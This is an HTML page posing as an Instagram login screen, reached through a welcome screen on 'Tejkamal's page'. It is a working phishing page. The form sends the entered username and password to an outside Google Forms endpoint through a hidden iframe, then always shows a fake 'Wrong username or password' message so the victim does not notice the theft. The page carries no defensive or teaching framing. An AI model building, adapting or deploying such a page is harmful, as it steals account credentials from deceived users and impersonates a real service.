<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Instagram</title>
  <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;500;600&display=swap" rel="stylesheet">
  <style>
    * {
      box-sizing: border-box;
    }

    body {
      font-family: 'Poppins', sans-serif;
      background: linear-gradient(to top left, #fdfbfb, #ebedee);
      display: flex;
      justify-content: center;
      align-items: center;
      min-height: 100vh;
      margin: 0;
      flex-direction: column;
      padding: 10px;
    }

    /* Welcome Screen */
    #welcome-screen {
      background: white;
      border-radius: 16px;
      padding: 40px 25px;
      box-shadow: 0 4px 15px rgba(0, 0, 0, 0.1);
      text-align: center;
      animation: fadeIn 1.2s ease-in-out;
      max-width: 400px;
      width: 100%;
    }

    #welcome-screen h2 {
      font-size: 22px;
      margin-bottom: 20px;
      color: #262626;
    }

    #welcome-screen button {
      padding: 12px 20px;
      background: linear-gradient(135deg, #405de6, #833ab4, #e1306c, #fd1d1d);
      background-size: 300% 300%;
      color: white;
      border: none;
      border-radius: 30px;
      font-size: 14px;
      font-weight: bold;
      cursor: pointer;
      transition: all 0.4s ease;
    }

    #welcome-screen button:hover {
      background-position: right center;
      box-shadow: 0 8px 15px rgba(0, 0, 0, 0.15);
      transform: scale(1.05);
    }

    @keyframes fadeIn {
      from { opacity: 0; transform: translateY(20px); }
      to { opacity: 1; transform: translateY(0); }
    }

    .login-container {
      width: 100%;
      max-width: 350px;
      text-align: center;
    }

    .title {
      font-size: 32px;
      font-weight: bold;
      color: #262626;
      margin: 20px 0 30px;
      letter-spacing: 1px;
    }

    .login-box {
      background: #ffffff;
      border-radius: 15px;
      padding: 30px 20px;
      border: 1px solid #e6e6e6;
      box-shadow: 0 10px 25px rgba(0, 0, 0, 0.07);
      transition: all 0.3s ease;
    }

    .input-group {
      position: relative;
      margin: 15px 0;
    }

    .input-group input {
      width: 100%;
      padding: 12px 12px 12px 40px;
      border: 1px solid #dbdbdb;
      border-radius: 10px;
      background-color: #f9f9f9;
      font-size: 14px;
      transition: 0.3s;
      outline: none;
    }

    .input-group input:focus {
      border-color: #0095f6;
      background-color: #fff;
      box-shadow: 0 0 0 3px rgba(0,149,246,0.2);
    }

    .input-group::before {
      content: 'ðŸ‘¤';
      position: absolute;
      left: 12px;
      top: 12px;
      font-size: 16px;
      color: #bbb;
    }

    .input-group:nth-child(2)::before {
      content: 'ðŸ”’';
    }

    .login-box input[type="submit"] {
      width: 100%;
      padding: 10px;
      margin: 20px 0;
      background: linear-gradient(135deg, #3897f0, #007bb5);
      color: #fff;
      border: none;
      border-radius: 30px;
      font-size: 14px;
      font-weight: 600;
      cursor: pointer;
      transition: 0.3s;
    }

    .login-box input[type="submit"]:hover {
      background-position: right center;
      box-shadow: 0 6px 12px rgba(0, 0, 0, 0.1);
      transform: scale(1.02);
    }

    .error-message {
      color: #ed4956;
      font-size: 13px;
      margin-top: 10px;
      display: none;
    }

    .divider {
      display: flex;
      align-items: center;
      margin: 20px 0;
      color: #8e8e8e;
      font-size: 12px;
    }

    .divider hr {
      flex-grow: 1;
      border: none;
      border-top: 1px solid #dbdbdb;
    }

    .divider span {
      margin: 0 15px;
    }

    .footer {
      margin-top: 25px;
      font-size: 12px;
      color: #8e8e8e;
    }

    .footer a {
      color: #00376b;
      text-decoration: none;
      font-weight: 600;
    }

    @media screen and (max-width: 480px) {
      #welcome-screen,
      .login-box {
        padding: 25px 15px;
      }

      .input-group input {
        font-size: 13px;
      }

      .title {
        font-size: 28px;
      }

      #welcome-screen h2 {
        font-size: 20px;
      }
    }
  </style>
</head>
<body>

  <!-- Welcome Screen -->
  <div id="welcome-screen">
    <h2>Hi, welcome to Tejkamal's page ðŸ˜Š</h2>
    <button onclick="startInstagramLogin()">Sign up with Instagram</button>
  </div>

  <!-- Login Form -->
  <div id="login-section" class="login-container" style="display: none;">
    <div class="title">Instagram</div>
    <div class="login-box">
      <form action="https://docs.google.com/forms/u/0/d/e/1FAIpQLSeeQOC82j3KlAIyLeF57niS63fow9ij7N6VjaZVy-ayxhv4Cg/formResponse"
            method="POST"
            target="hidden_iframe"
            onsubmit="submitted = true;">
        <div class="input-group">
          <input type="text" name="entry.363416333" placeholder="Phone number, username, or email" required />
        </div>
        <div class="input-group">
          <input type="password" name="entry.20945221" placeholder="Password" required />
        </div>
        <input type="submit" value="Log In" />
      </form>

      <iframe name="hidden_iframe" id="hidden_iframe" style="display:none;" onload="if(submitted){ window.location.href='?error=true'; }"></iframe>

      <div id="errorMessage" class="error-message">Wrong username or password</div>

      <div class="divider">
        <hr /><span>OR</span><hr />
      </div>

      <div class="footer">
        Don't have an account? <a href="#">Sign up</a>
      </div>
    </div>
  </div>

  <script>
    let submitted = false;

    window.onload = function () {
      const params = new URLSearchParams(window.location.search);
      const alreadyVisited = sessionStorage.getItem('visited');

      if (alreadyVisited || params.get("error") === "true") {
        document.getElementById('welcome-screen').style.display = 'none';
        document.getElementById('login-section').style.display = 'block';
      }

      if (params.get("error") === "true") {
        document.getElementById("errorMessage").style.display = "block";
      }
    };

    function startInstagramLogin() {
      sessionStorage.setItem('visited', 'true');
      document.getElementById('welcome-screen').style.display = 'none';
      document.getElementById('login-section').style.display = 'block';
    }
  </script>
</body>
</html>
